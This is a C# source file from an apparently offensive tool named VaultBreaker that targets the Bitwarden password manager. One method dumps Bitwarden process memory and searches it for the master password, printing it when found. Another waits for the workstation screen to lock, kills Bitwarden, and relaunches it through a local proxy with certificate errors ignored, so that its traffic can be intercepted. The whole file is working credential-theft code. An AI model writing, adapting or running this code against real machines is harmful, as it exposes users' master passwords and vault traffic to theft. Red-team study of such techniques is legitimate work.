using System;
using System.Diagnostics;
using VaultBreaker.Helpers;

namespace VaultBreaker.Core
{
	public class BitWarden
	{
		public static void dumpBitwardenMaster()
		{
			//Process[] procs = Process.GetProcessesByName("Bitwarden.exe");
			Process[] procs = Process.GetProcessesByName("BiTWarDen");
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
			foreach (var proc in procs)
			{
                DebugFunctions.writeDebug(String.Format("Enumerating Process: {0} - {1}", proc.Id, proc.ProcessName), Globals.DebugMode);
				string strResult = MemoryHelper.dumpProcessMemory(proc);
				//var matches = Regex.Matches(strResult, "offline_access").Cast<Match>().Select(m => m.Index);
				//foreach (var match in matches)
				//{
				//	Console.WriteLine(match);
				//}
				//Maybe convert this to a regex. Shouldn't take a long time and end with a cleaner result.
				if (strResult.Contains("\"amr\":[\"Application\"]}"))
				{
                    DebugFunctions.writeDebug("Found String Indicator, attempting to pull password", Globals.DebugMode);
                    int start, end;
					start = strResult.IndexOf("\"amr\":[\"Application\"]}", 0);
					end = start + 100;
					Console.WriteLine("[SUCCESS] Potential Bitwarden Password Location found! {0}",strResult.Substring(start, end - start).Split('\0')[1]);
                    return;
				}
				else
				{
					Console.WriteLine("[-] Unable to locate Master Password in this process.");
                }
            } //endfor
            Console.WriteLine("[-] Unable to locate Master Password in any process.");
        }

        public static void LaunchWithProxy(bool force)
		{

			//Check if screen is locked.
			if (!force)
			{
				DebugFunctions.writeDebug("Waiting for Screen to lock before bouncing application", Globals.DebugMode);
				Monitoring.CheckForWorkstationLocking workLock = new Monitoring.CheckForWorkstationLocking();

				workLock.Run();

				Console.WriteLine("Press ESC to exit...");
				while (!workLock.screenLocked)
				{
					//wait a bit before checking again.
					System.Threading.Thread.Sleep(10000);
				};
				DebugFunctions.writeDebug("Screen lock notification recieved, continuing.", Globals.DebugMode);
			}
			string procPath = "";
			Process[] procs = Process.GetProcessesByName("Bitwarden");
			if(procs.Length < 1)
			{
				DebugFunctions.writeDebug("No Processes found", Globals.DebugMode);
			}
			foreach(var proc in procs)
			{
				if (procPath == "")
				{
					procPath = proc.MainModule.FileName;
					DebugFunctions.writeDebug("Getting Process Path: " + procPath, Globals.DebugMode);
				}
				//Kill All current Running Processes.
				proc.Kill();
			}
			DebugFunctions.writeDebug("Starting Process with New Arguments", Globals.DebugMode);
			Process bw = new Process();
			bw.StartInfo.FileName=procPath;
			bw.StartInfo.Arguments = "--proxy-server=http://127.0.0.1:8888 --ignore-certificate-errors";
			bw.Start();
		}
	}
}
